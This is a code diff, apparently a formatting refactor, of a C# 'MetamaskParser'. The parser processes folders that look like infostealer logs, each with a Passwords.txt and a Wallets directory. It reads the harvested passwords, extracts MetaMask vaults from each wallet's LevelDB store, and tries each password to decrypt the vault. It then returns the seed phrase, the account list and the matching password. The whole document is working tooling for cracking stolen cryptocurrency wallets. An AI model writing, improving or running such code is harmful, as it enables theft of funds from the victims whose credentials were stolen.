@@ -13,31 +13,29 @@ public enum WalletType
 
 public class MetamaskParser
 {
-    public IEnumerable<MetamaskWallet?> ByLogs(string logs) => Directory.GetDirectories(logs).SelectMany(ByLog);
+    public IEnumerable<MetamaskWallet?> ByLogs(string logs) =>
+        Directory.GetDirectories(logs).SelectMany(ByLog);
 
     public IEnumerable<MetamaskWallet?> ByLog(string log)
     {
         var passwords = new List<string>();
-        var passwordsPath = Path.Combine(log, "Passwords.txt");
-        var walletsPath = Path.Combine(log, "Wallets");
-        
+        string passwordsPath = Path.Combine(log, "Passwords.txt");
+        string walletsPath = Path.Combine(log, "Wallets");
+
         if (!File.Exists(passwordsPath) || !Directory.Exists(walletsPath)) yield break;
 
         using var reader = new StreamReader(passwordsPath);
 
         while (!reader.EndOfStream)
         {
-            var line = reader.ReadLine() ?? "";
-            
+            string line = reader.ReadLine() ?? "";
+
             if (!line.StartsWith("Password")) continue;
-            
+
             passwords.Add(line["Password: ".Length..line.Length]);
         }
-        
-        foreach (var wallet in Directory.GetDirectories(walletsPath))
-        {
-            yield return ByWallet(wallet, passwords);
-        }
+
+        foreach (string wallet in Directory.GetDirectories(walletsPath)) yield return ByWallet(wallet, passwords);
     }
 
     public MetamaskWallet? ByWallet(string dir, IEnumerable<string> passwords)
@@ -50,7 +48,7 @@ public class MetamaskParser
         };
 
         JObject json;
-        
+
         try
         {
             using var db = new DB(options, dir);
@@ -61,59 +59,62 @@ public class MetamaskParser
         {
             return null;
         }
-        
-        if (ParseVault(json) is not {} vault) return null;
-        
+
+        if (MetamaskParser.ParseVault(json) is not { } vault) return null;
+
         string? decrypted = null, password = null;
 
         // get mnemonic
-        foreach (var pass in passwords)
+        foreach (string pass in passwords)
         {
             decrypted = AesGcmCryptor.DecryptVault(pass, vault);
 
-            if (decrypted is not null)
+            if (decrypted is { })
             {
                 password = pass;
-                
+
                 break;
             }
         }
 
         if (decrypted is null) return null;
-        
+
         return new MetamaskWallet
         {
-            Mnemonic = GetMnemonic(decrypted),
+            Mnemonic = MetamaskParser.GetMnemonic(decrypted),
             Type = WalletType.Metamask,
-            Accounts = ParseAccounts(json),
+            Accounts = MetamaskParser.ParseAccounts(json),
             Password = password
         };
+    }
+
+    private static string GetMnemonic(string decrypted)
+    {
+        dynamic? json = JsonConvert.DeserializeObject<dynamic>(decrypted);
+
+        try
+        {
+            byte[] bytes = JArray.Parse((string)json![0].data.mnemonic.ToString()).ToObject<byte[]>()!;
+
+            return Encoding.UTF8.GetString(bytes);
+        }
+        catch
+        {
+            return (string)json![0].data.mnemonic;
+        }
     }
 
     #region Db parsers
 
     private static Dictionary<string, MetamaskAccount> ParseAccounts(JObject json) =>
-        JsonConvert.DeserializeObject<Dictionary<string, MetamaskAccount>>(json["PreferencesController"]?["identities"]?.ToString() ?? "") ?? new ();
-    
-    private static Vault? ParseVault(JObject json) => JsonConvert.DeserializeObject<Vault>(json["KeyringController"]?["vault"]?.ToString() ?? "");
+        JsonConvert.DeserializeObject<Dictionary<string, MetamaskAccount>>(json["PreferencesController"]?
+            ["identities"]?.ToString() ?? "") ??
+        new Dictionary<string, MetamaskAccount>();
+
+    private static Vault? ParseVault(JObject json) =>
+        JsonConvert.DeserializeObject<Vault>(json["KeyringController"]?["vault"]?.ToString() ?? "");
 
     #endregion
-    
-    private static string GetMnemonic(string decrypted)
-    {
-        var json = JsonConvert.DeserializeObject<dynamic>(decrypted);
-
-        try
-        {
-            var bytes = JArray.Parse((string)json![0].data.mnemonic.ToString()).ToObject<byte[]>()!;
-            
-            return Encoding.UTF8.GetString(bytes);
-        }
-        catch
-        {
-            return (string) json![0].data.mnemonic;
-        }
-    }
 }
 
 public class Vault
